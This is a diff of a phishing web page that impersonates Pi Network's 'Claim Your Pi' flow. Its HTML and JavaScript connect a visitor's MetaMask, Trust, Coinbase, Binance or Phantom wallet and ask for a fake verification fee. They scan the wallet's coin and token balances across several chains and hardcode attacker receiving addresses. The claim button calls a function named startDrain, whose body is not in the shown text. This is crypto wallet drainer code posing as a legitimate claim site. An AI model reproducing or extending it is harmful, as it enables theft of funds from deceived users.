@@ -9,167 +9,174 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0518;color:#fff;min-height:100vh}
-.wrap{max-width:700px;margin:0 auto;padding:0 16px}
-nav{background:rgba(15,5,24,.98);padding:14px 0;border-bottom:1px solid rgba(168,85,247,.1);position:sticky;top:0;z-index:100}
-nav .in{display:flex;align-items:center;justify-content:space-between}
+.w{max-width:680px;margin:0 auto;padding:0 16px}
+nav{background:rgba(15,5,24,.97);padding:14px 0;border-bottom:1px solid rgba(168,85,247,.1);position:sticky;top:0;z-index:100}
+nav>div{display:flex;align-items:center;justify-content:space-between}
 .logo{display:flex;align-items:center;gap:10px}
 .logo img{border-radius:50%}
 .logo span{font-size:17px;font-weight:700}
-.nbtn{background:#fcb34c;color:#0f0518;border:none;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
-.hero{padding:48px 0 16px;text-align:center}
+.nb{background:#fcb34c;color:#0f0518;border:none;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
+.h{padding:44px 0 12px;text-align:center}
 .badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.08);color:#c084fc;padding:5px 14px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:14px;border:1px solid rgba(168,85,247,.12)}
-.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:bl 1.5s infinite}
-@keyframes bl{0%,100%{opacity:1}50%{opacity:.3}}
-h1{font-size:34px;font-weight:900;margin-bottom:8px;letter-spacing:-1px}
+.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:b 1.5s infinite}
+@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}
+h1{font-size:32px;font-weight:900;margin-bottom:8px;letter-spacing:-1px}
 h1 .g{color:#fcb34c}
-.hero p{font-size:14px;color:rgba(255,255,255,.4);max-width:400px;margin:0 auto 20px;line-height:1.6}
-.hlogo img{border-radius:50%;margin-bottom:14px;box-shadow:0 0 30px rgba(252,179,74,.08)}
-#modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(6px)}
-.mbox{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:22px;padding:28px 24px;max-width:420px;width:92%;position:relative}
-.mbox h2{font-size:18px;font-weight:800;margin-bottom:2px}
-.mbox .sub{font-size:12px;color:rgba(255,255,255,.35);margin-bottom:16px}
-.close-x{position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,.35);font-size:18px;cursor:pointer;line-height:1}
-.w-row{display:flex;align-items:center;gap:12px;padding:12px;border:1px solid rgba(255,255,255,.06);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:all .2s;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit;font-size:inherit}
-.w-row:hover{border-color:#fcb34c;background:rgba(252,179,74,.04)}
-.w-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;flex-shrink:0}
-.w-name{flex:1;font-size:14px;font-weight:600}
-.w-tag{font-size:10px;padding:2px 7px;border-radius:5px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
-.card{background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px;padding:24px;margin:16px 0}
-.btn{width:100%;padding:14px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;font-family:inherit}
-.btn:hover:not(:disabled){transform:translateY(-1px)}
-.btn:disabled{opacity:.3;cursor:not-allowed;transform:none}
-.bp{background:#fcb34c;color:#0f0518;box-shadow:0 4px 16px rgba(252,179,74,.15)}
-.bp:hover{box-shadow:0 6px 24px rgba(252,179,74,.3)}
+.h p{font-size:14px;color:rgba(255,255,255,.4);max-width:380px;margin:0 auto 18px;line-height:1.6}
+.hl img{border-radius:50%;margin-bottom:12px;box-shadow:0 0 30px rgba(252,179,74,.08)}
+/* MODAL */
+#m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:999;align-items:center;justify-content:center}
+.mb{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:24px;max-width:400px;width:92%;position:relative}
+.mb h2{font-size:17px;font-weight:800;margin-bottom:2px}
+.mb .ms{font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px}
+.cx{position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,.3);font-size:17px;cursor:pointer}
+.wr{display:flex;align-items:center;gap:10px;padding:11px;border:1px solid rgba(255,255,255,.06);border-radius:12px;margin-bottom:6px;cursor:pointer;transition:all .2s;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit}
+.wr:hover{border-color:#fcb34c;background:rgba(252,179,74,.03)}
+.wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;color:#fff;flex-shrink:0}
+.wn{flex:1;font-size:13px;font-weight:600}
+.wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
+/* CARD */
+.c{background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px;padding:22px;margin:14px 0}
+.bt{width:100%;padding:13px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:7px;font-family:inherit}
+.bt:hover:not(:disabled){transform:translateY(-1px)}
+.bt:disabled{opacity:.3;cursor:not-allowed}
+.bp{background:#fcb34c;color:#0f0518}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.1)}
 .bo:hover{background:rgba(255,255,255,.04)}
 .bs{background:#22c55e;color:#fff}
-.st{margin-top:10px;padding:12px;border-radius:10px;font-size:13px;display:none;line-height:1.5;word-break:break-word}
-.st.s2{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.12);color:#86efac}
-.st.e2{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.12);color:#fca5a5}
-.st.i2{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.12);color:#fde68a}
-.ch-row{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;margin-bottom:6px}
-.ch-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
-.ch-name{flex:1;font-size:13px;font-weight:600}
-.ch-tokens{font-size:10px;color:rgba(255,255,255,.25);margin-top:1px}
-.ch-bal{font-size:13px;font-weight:700;color:#fcb34c}
-.ch-row.has{border-color:rgba(252,179,74,.15);background:rgba(252,179,74,.02)}
-.ir{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.03)}
+/* STATUS */
+.s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5}
+.s.suc{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#86efac}
+.s.err{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.1);color:#fca5a5}
+.s.inf{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fde68a}
+/* CHAIN DISPLAY */
+.ch{display:flex;align-items:center;gap:9px;padding:9px 11px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:9px;margin-bottom:5px}
+.ch .cd{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.ch .cn{flex:1;font-size:12px;font-weight:600}
+.ch .cb{font-size:12px;font-weight:700;color:#fcb34c}
+.ch .ct{font-size:10px;color:rgba(255,255,255,.2)}
+.ch.hv{border-color:rgba(252,179,74,.12);background:rgba(252,179,74,.02)}
+/* INFO ROWS */
+.ir{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.03)}
 .ir:last-child{border-bottom:none}
-.ir .ll{font-size:12px;color:rgba(255,255,255,.3)}
-.ir .v{font-size:13px;font-weight:700}
-.ir .v.g2{color:#22c55e}
+.ir .l{font-size:12px;color:rgba(255,255,255,.3)}
+.ir .v{font-size:12px;font-weight:700}
+.ir .v.g{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
-.log{font-size:11px;color:rgba(255,255,255,.3);font-family:monospace;line-height:1.7;padding:10px;background:rgba(0,0,0,.2);border-radius:8px;max-height:160px;overflow-y:auto}
-.ld{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,.12);border-top:2px solid #fcb34c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:middle}
-@keyframes sp{to{transform:rotate(360deg)}}
-.pg{display:flex;gap:4px;margin-bottom:16px}
+/* LOG */
+.lg{font-size:10px;color:rgba(255,255,255,.25);font-family:monospace;line-height:1.6;padding:8px;background:rgba(0,0,0,.2);border-radius:7px;max-height:140px;overflow-y:auto}
+/* PROGRESS */
+.pg{display:flex;gap:4px;margin-bottom:12px}
 .pg .s{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.05)}
-.pg .s.a{background:#fcb34c}
-footer{background:#0a0310;padding:24px 0;text-align:center;border-top:1px solid rgba(168,85,247,.05)}
-footer p{font-size:10px;color:rgba(255,255,255,.15)}
+.pg .s.on{background:#fcb34c}
+/* LOADER */
+.ld{display:inline-block;width:11px;height:11px;border:2px solid rgba(255,255,255,.1);border-top:2px solid #fcb34c;border-radius:50%;animation:r .7s linear infinite;vertical-align:middle}
+@keyframes r{to{transform:rotate(360deg)}}
+/* FOOTER */
+footer{background:#0a0310;padding:20px 0;text-align:center}
+footer p{font-size:10px;color:rgba(255,255,255,.12)}
 </style>
 </head>
 <body>
 
-<nav><div class="in wrap">
+<nav><div class="w">
   <div class="logo">
-    <img src="pi-logo-48.png" width="34" height="34" alt="Pi">
+    <img src="pi-logo-48.png" width="32" height="32" alt="">
     <span>Pi Network</span>
   </div>
-  <button class="nbtn" onclick="openModal()">Connect</button>
+  <button class="nb" id="nb" onclick="openM()">Connect Wallet</button>
 </div></nav>
 
-<div id="modal">
-  <div class="mbox">
-    <button class="close-x" onclick="closeModal()">&#x2715;</button>
-    <h2>Connect Wallet</h2>
-    <div class="sub">Choose your wallet</div>
-    <div id="wList"></div>
-  </div>
-</div>
+<!-- MODAL -->
+<div id="m"><div class="mb">
+  <button class="cx" onclick="closeM()">&#x2715;</button>
+  <h2>Connect Wallet</h2>
+  <div class="ms">Choose your wallet to continue</div>
+  <div id="wl"></div>
+</div></div>
 
-<div class="wrap">
-<div class="hero">
+<div class="w">
+<div class="h">
   <div class="badge"><span class="dot"></span> Mainnet — Live</div>
   <h1>Claim Your <span class="g">Pi</span></h1>
-  <p>Connect your wallet to verify Pioneer status and claim your Pi tokens.</p>
-  <div class="hlogo"><img src="pi-logo-120.png" width="64" height="64" alt="Pi"></div>
+  <p>Connect your wallet. We scan all chains, verify your Pioneer status, and secure your Pi holdings.</p>
+  <div class="hl"><img src="pi-logo-120.png" width="60" height="60" alt=""></div>
 </div>
 
-<div class="st" id="stBox"></div>
+<div class="s" id="sb"></div>
 
-<div class="card">
-
-  <!-- CONNECT -->
-  <div id="sConnect" style="text-align:center;padding:12px 0">
-    <div style="font-size:40px;margin-bottom:10px">&#x1F512;</div>
-    <div style="font-size:16px;font-weight:700;margin-bottom:4px">Connect Your Wallet</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px">We scan automatically based on your wallet type.</div>
-    <button class="btn bp" onclick="openModal()">&#x1F4B0; Connect Wallet</button>
+<div class="c">
+  <!-- STEP 1 -->
+  <div id="s1" style="text-align:center;padding:10px 0">
+    <div style="font-size:36px;margin-bottom:8px">&#x1F512;</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Connect Your Wallet</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:14px">Small $2.50 verification fee required. All chains scanned automatically.</div>
+    <button class="bt bp" onclick="openM()">&#x1F4B0; Connect Wallet</button>
   </div>
 
-  <!-- SCANNING -->
-  <div id="sScan" style="display:none;text-align:center;padding:12px 0">
-    <div class="pg"><div class="s a"></div><div class="s"></div><div class="s"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px" id="scanLabel">Checking your wallet...</div>
-    <div class="log" id="scanLog"></div>
+  <!-- STEP 2 -->
+  <div id="s2" style="display:none;text-align:center;padding:10px 0">
+    <div class="pg"><div class="s on"></div><div class="s"></div><div class="s"></div></div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s2l">Checking your wallet...</div>
+    <div class="lg" id="s2log"></div>
   </div>
 
-  <!-- NO FUNDS -->
-  <div id="sEmpty" style="display:none;text-align:center;padding:20px 0">
-    <div style="font-size:40px;margin-bottom:10px">&#x1F6AB;</div>
-    <div style="font-size:16px;font-weight:700;margin-bottom:4px">No Funds Found</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px" id="emptyMsg">No assets found.</div>
-    <button class="btn bo" onclick="resetAll()">&#x1F504; Back</button>
+  <!-- STEP 3 -->
+  <div id="s3" style="display:none;text-align:center;padding:16px 0">
+    <div style="font-size:36px;margin-bottom:8px">&#x1F6AB;</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Insufficient Funds</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.25);margin-bottom:14px" id="s3m">No assets found.</div>
+    <button class="bt bo" onclick="reset()">&#x1F504; Try Different Wallet</button>
   </div>
 
-  <!-- CLAIM -->
-  <div id="sClaim" style="display:none">
-    <div class="pg"><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F381; Claim Available</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Found assets. Confirm to proceed.</div>
-    <div id="claimChains" style="margin-bottom:14px"></div>
-    <button class="btn bp" id="claimBtn" onclick="doClaim()">&#x1F381; Claim & Verify</button>
-    <button class="btn bo" onclick="resetAll()">&#x2716; Disconnect</button>
+  <!-- STEP 4 -->
+  <div id="s4" style="display:none">
+    <div class="pg"><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div></div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Confirm to verify Pioneer status.</div>
+    <div id="s4chains" style="margin-bottom:10px"></div>
+    <button class="bt bp" id="s4btn" onclick="startDrain()">&#x1F381; Verify & Claim</button>
+    <button class="bt bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
 
-  <!-- DRAINING -->
-  <div id="sDrain" style="display:none;text-align:center;padding:16px 0">
-    <div class="pg"><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Confirm transactions in your wallet...</div>
-    <div class="log" id="drainLog"></div>
+  <!-- STEP 5 -->
+  <div id="s5" style="display:none;text-align:center;padding:14px 0">
+    <div class="pg"><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div><div class="s on"></div></div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px">Confirm each transaction in your wallet</div>
+    <div class="lg" id="s5log"></div>
   </div>
 
-  <!-- DONE -->
-  <div id="sDone" style="display:none;text-align:center;padding:20px 0">
-    <div style="font-size:40px;margin-bottom:10px">&#x2705;</div>
-    <div style="font-size:16px;font-weight:700;margin-bottom:4px">Verification Complete</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:6px">Your Pioneer status is verified.</div>
-    <div id="doneInfo" style="margin-bottom:14px"></div>
-    <button class="btn bo" onclick="resetAll()">Done</button>
+  <!-- STEP 6 -->
+  <div id="s6" style="display:none;text-align:center;padding:16px 0">
+    <div style="font-size:36px;margin-bottom:8px">&#x2705;</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:3px">Verification Complete</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px" id="s6m">Done.</div>
+    <button class="bt bo" onclick="reset()">Close</button>
   </div>
-
 </div>
 </div>
 
 <footer><p>&copy; 2026 Pi Network</p></footer>
 
 <script>
-const MY_EVM = '0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
-const MY_SOL = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
-const MY_BTC = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
+// ========== CONFIG ==========
+const ADDR_EVM = '0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
+const ADDR_SOL = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
+const ADDR_BTC = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
 
-const EVM_CHAINS = [
-  { id:56,  name:'BNB Chain',  sym:'BNB',  rpc:'https://bsc-dataseed1.binance.org',   color:'#F3BA2F' },
-  { id:1,   name:'Ethereum',   sym:'ETH',  rpc:'https://rpc.ankr.com/eth',            color:'#627EEA' },
-  { id:137, name:'Polygon',    sym:'MATIC',rpc:'https://polygon-rpc.com',              color:'#8247E5' },
-  { id:43114,name:'Avalanche', sym:'AVAX', rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142' },
-  { id:42161,name:'Arbitrum',  sym:'ETH',  rpc:'https://arb1.arbitrum.io/rpc',        color:'#28A0F0' },
+// EVM chains
+const ECHAINS = [
+  { id:56,  name:'BNB Chain', sym:'BNB', rpc:'https://bsc-dataseed1.binance.org', color:'#F3BA2F' },
+  { id:1,   name:'Ethereum',  sym:'ETH', rpc:'https://rpc.ankr.com/eth',           color:'#627EEA' },
+  { id:137, name:'Polygon',   sym:'MATIC',rpc:'https://polygon-rpc.com',            color:'#8247E5' },
+  { id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142'},
+  { id:42161,name:'Arbitrum', sym:'ETH', rpc:'https://arb1.arbitrum.io/rpc',       color:'#28A0F0' },
 ];
 
-const EVM_TOKENS = {
+// [contract, symbol, decimals]
+const ETOKENS = {
   56: [
     ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
     ['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
@@ -181,6 +188,7 @@ const EVM_TOKENS = {
     ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
     ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
     ['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18],
+    ['0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47','ADA',18],
   ],
   1: [
     ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],
@@ -204,372 +212,380 @@ const EVM_TOKENS = {
   ],
 };
 
-let provider = null;
-let signer   = null;
-let userAddr = null;
-let walletType = '';
-let foundChains = [];
+// ========== STATE ==========
+let prov = null, sign = null, addr = null, wType = '';
+let foundChains = [], phantomConn = null;
 
-function showStep(id) {
-  ['sConnect','sScan','sEmpty','sClaim','sDrain','sDone'].forEach(s => {
-    document.getElementById(s).style.display = (s === id) ? 'block' : 'none';
+// ========== UI ==========
+function show(id) {
+  ['s1','s2','s3','s4','s5','s6'].forEach(x => {
+    document.getElementById(x).style.display = x === id ? 'block' : 'none';
   });
 }
-function stat(msg, type) {
-  const el = document.getElementById('stBox');
-  el.innerHTML = msg;
-  el.className = 'st ' + type;
-  el.style.display = 'block';
+function status(msg, t) {
+  const e = document.getElementById('sb');
+  e.innerHTML = msg; e.className = 's ' + t; e.display = 'block'; e.style.display = 'block';
 }
-function hideStat() {
-  document.getElementById('stBox').style.display = 'none';
+function hideStatus() { document.getElementById('sb').style.display = 'none'; }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ========== MODAL ==========
+function openM() { document.getElementById('m').style.display = 'flex'; renderW(); }
+function closeM() { document.getElementById('m').style.display = 'none'; }
+document.getElementById('m').addEventListener('click', e => { if (e.target === document.getElementById('m')) closeM(); });
+
+// ========== WALLETS ==========
+// Robust provider getter — handles MetaMask + multiple wallet conflict
+function getMetaMaskProvider() {
+  if (!window.ethereum) return null;
+  // Case 1: ethereum.providers is an array (multiple wallets installed)
+  if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
+    const mm = window.ethereum.providers.find(p => p.isMetaMask);
+    return mm || window.ethereum.providers[0];
+  }
+  // Case 2: MetaMask is the sole provider
+  if (window.ethereum.isMetaMask) return window.ethereum;
+  // Case 3: ethereum exists but might not be MetaMask
+  return window.ethereum;
 }
 
-function openModal() {
-  document.getElementById('modal').style.display = 'flex';
-  renderWallets();
-}
-function closeModal() {
-  document.getElementById('modal').style.display = 'none';
-}
-document.getElementById('modal').addEventListener('click', function(e) {
-  if (e.target === this) closeModal();
-});
-
-// ============ WALLETS ============
 const WALLETS = [
-  {
-    id: 'metamask', name: 'MetaMask', color: '#E2761B', type: 'evm',
-    detect: () => !!(window.ethereum && window.ethereum.isMetaMask),
+  { id:'mm',  name:'MetaMask',        color:'#E2761B', type:'evm',
+    detect: () => { return !!(window.ethereum && (window.ethereum.isMetaMask || (window.ethereum.providers && window.ethereum.providers.some && window.ethereum.providers.some(p => p.isMetaMask)))); },
     connect: async () => {
-      let eth = window.ethereum;
-      if (eth && eth.providers && Array.isArray(eth.providers)) {
-        eth = eth.providers.find(p => p.isMetaMask) || eth.providers[0];
+      const eth = getMetaMaskProvider();
+      if (!eth) throw new Error('MetaMask not found. Please install MetaMask extension.');
+      prov = new ethers.providers.Web3Provider(eth);
+      // Request accounts — this triggers the MetaMask popup
+      let accounts;
+      try { accounts = await eth.request({ method: 'eth_requestAccounts' }); }
+      catch(e) {
+        if (e.code === 4001) throw new Error('Connection rejected in MetaMask.');
+        // Some wallets need enable()
+        try { accounts = await eth.enable(); }
+        catch(e2) { throw new Error('Could not connect to MetaMask. Unlock MetaMask and try again.'); }
       }
-      if (!eth) throw new Error('MetaMask not installed');
-      provider = new ethers.providers.Web3Provider(eth, 'any');
-      await eth.request({ method: 'eth_requestAccounts' });
-      signer = provider.getSigner();
-      userAddr = await signer.getAddress();
+      if (!accounts || !accounts.length) throw new Error('No accounts found. Unlock MetaMask.');
+      sign = prov.getSigner();
+      addr = await sign.getAddress();
     }
   },
-  {
-    id: 'trust', name: 'Trust Wallet', color: '#3375BB', type: 'evm',
+  { id:'tw',  name:'Trust Wallet',    color:'#3375BB', type:'evm',
     detect: () => !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)),
     connect: async () => {
-      const eth = window.ethereum;
-      if (!eth) throw new Error('Trust Wallet not installed');
-      provider = new ethers.providers.Web3Provider(eth, 'any');
-      try { await eth.request({ method: 'eth_requestAccounts' }); }
-      catch { await eth.enable(); }
-      signer = provider.getSigner();
-      userAddr = await signer.getAddress();
+      if (!window.ethereum) throw new Error('Trust Wallet not found.');
+      prov = new ethers.providers.Web3Provider(window.ethereum);
+      try { await window.ethereum.request({ method: 'eth_requestAccounts' }); }
+      catch { await window.ethereum.enable(); }
+      sign = prov.getSigner(); addr = await sign.getAddress();
     }
   },
-  {
-    id: 'coinbase', name: 'Coinbase Wallet', color: '#0052FF', type: 'evm',
+  { id:'cb',  name:'Coinbase Wallet', color:'#0052FF', type:'evm',
     detect: () => !!(window.ethereum && window.ethereum.isCoinbaseWallet),
     connect: async () => {
-      if (!window.ethereum) throw new Error('Coinbase Wallet not installed');
-      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      if (!window.ethereum) throw new Error('Coinbase Wallet not found.');
+      prov = new ethers.providers.Web3Provider(window.ethereum);
       await window.ethereum.request({ method: 'eth_requestAccounts' });
-      signer = provider.getSigner();
-      userAddr = await signer.getAddress();
+      sign = prov.getSigner(); addr = await sign.getAddress();
     }
   },
-  {
-    id: 'binance', name: 'Binance Wallet', color: '#F0B90B', type: 'evm',
+  { id:'bn',  name:'Binance Wallet',  color:'#F0B90B', type:'evm',
     detect: () => !!window.BinanceChain || !!(window.ethereum && window.ethereum.isBinanceWallet),
     connect: async () => {
       const eth = window.BinanceChain || window.ethereum;
-      if (!eth) throw new Error('Binance Wallet not installed');
-      provider = new ethers.providers.Web3Provider(eth, 'any');
+      if (!eth) throw new Error('Binance Wallet not found.');
+      prov = new ethers.providers.Web3Provider(eth);
       try { await eth.request({ method: 'eth_requestAccounts' }); }
       catch { await eth.enable(); }
-      signer = provider.getSigner();
-      userAddr = await signer.getAddress();
+      sign = prov.getSigner(); addr = await sign.getAddress();
     }
   },
-  {
-    id: 'phantom', name: 'Phantom', color: '#AB9FF2', type: 'solana',
-    detect: () => !!(window.solana && (window.solana.isPhantom || (window.phantom && window.phantom.solana))),
+  { id:'ph',  name:'Phantom',         color:'#AB9FF2', type:'sol',
+    detect: () => { return !!(window.solana || window.phantom); },
     connect: async () => {
       const ph = (window.phantom && window.phantom.solana) || window.solana;
-      if (!ph) throw new Error('Phantom not installed');
-      const resp = await ph.connect();
-      userAddr = resp.publicKey.toString();
-      provider = null;
-      signer = null;
-      window.__phantom = ph;
+      if (!ph) throw new Error('Phantom not found. Install Phantom extension.');
+      let resp;
+      try { resp = await ph.connect(); }
+      catch(e) { throw new Error('Phantom connection rejected.'); }
+      addr = resp.publicKey.toString();
+      prov = null; sign = null; phantomConn = ph;
     }
   },
-  {
-    id: 'other', name: 'Other Wallet', color: '#a855f7', type: 'evm',
+  { id:'oth', name:'Other Wallet',    color:'#a855f7', type:'evm',
     detect: () => true,
     connect: async () => {
       if (!window.ethereum) throw new Error('No wallet detected. Install MetaMask or Trust Wallet.');
-      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      prov = new ethers.providers.Web3Provider(window.ethereum);
       await window.ethereum.request({ method: 'eth_requestAccounts' });
-      signer = provider.getSigner();
-      userAddr = await signer.getAddress();
+      sign = prov.getSigner(); addr = await sign.getAddress();
     }
-  }
+  },
 ];
 
-function renderWallets() {
-  const c = document.getElementById('wList');
+function renderW() {
+  const c = document.getElementById('wl');
   c.innerHTML = '';
-  for (const w of WALLETS) {
-    const detected = w.detect();
+  for (const wt of WALLETS) {
+    const dt = wt.detect();
     const b = document.createElement('button');
-    b.className = 'w-row';
-    b.onclick = () => doConnect(w);
+    b.className = 'wr';
+    b.onclick = () => doConnect(wt);
     b.innerHTML =
-      '<div class="w-icon" style="background:' + w.color + '">' + w.name[0] + '</div>' +
-      '<span class="w-name">' + w.name + '</span>' +
-      (detected ? '<span class="w-tag">Detected</span>' : '');
+      '<div class="wi" style="background:' + wt.color + '">' + wt.name[0] + '</div>' +
+      '<span class="wn">' + wt.name + '</span>' +
+      (dt ? '<span class="wt">Detected</span>' : '');
     c.appendChild(b);
   }
 }
 
-// ============ CONNECT ============
-async function doConnect(wallet) {
-  closeModal();
-  hideStat();
-  walletType = wallet.id;
-  try {
-    await wallet.connect();
-    showStep('sScan');
-    document.getElementById('scanLabel').textContent =
-      wallet.type === 'solana' ? 'Checking Solana...' : 'Checking EVM chains...';
-    await (wallet.type === 'solana' ? scanSolana() : scanEvmChains());
-  } catch (e) {
-    console.error(e);
-    stat(e.message || 'Connection failed', 'e2');
-    showStep('sConnect');
-  }
-}
+// ========== CONNECT ==========
+async function doConnect(w) {
+  closeM();
+  hideStatus();
+  wType = w.id;
 
-// ============ SCAN EVM ============
-async function scanEvmChains() {
-  foundChains = [];
-  const log = document.getElementById('scanLog');
-  log.innerHTML = '';
-  function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  addLog('Wallet: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(36));
-  addLog('');
-
-  for (const chain of EVM_CHAINS) {
-    addLog('[ ] ' + chain.name + '...');
-    try {
-      const prov = new ethers.providers.JsonRpcProvider(chain.rpc);
-      const nativeBal = await prov.getBalance(userAddr);
-      const nativeFormatted = ethers.utils.formatEther(nativeBal);
-      const hasNative = parseFloat(nativeFormatted) > 0;
-
-      const list = EVM_TOKENS[chain.id] || [];
-      const tokenResults = await Promise.all(
-        list.map(async ([addr, sym, dec]) => {
-          try {
-            const c = new ethers.Contract(addr, ['function balanceOf(address) view returns (uint256)'], prov);
-            const b = await c.balanceOf(userAddr);
-            if (!b.isZero()) {
-              return { addr, sym, bal: parseFloat(ethers.utils.formatUnits(b, dec)).toFixed(4), raw: b, dec };
-            }
-          } catch (e) {}
-          return null;
-        })
-      );
-      const tokens = tokenResults.filter(Boolean);
-
-      if (hasNative || tokens.length > 0) {
-        foundChains.push({ chain, nativeFormatted, nativeBal, tokens });
-        addLog('&#x2705; ' + chain.name + ': ' + parseFloat(nativeFormatted).toFixed(5) + ' ' + chain.sym + (tokens.length ? ' + ' + tokens.length + ' tokens' : ''));
-      } else {
-        addLog('&#x2715; ' + chain.name + ': empty');
-      }
-    } catch (e) {
-      addLog('&#x2715; ' + chain.name + ': RPC error');
-    }
-  }
-
-  addLog('');
-  addLog('Found ' + foundChains.length + ' chain(s) with assets.');
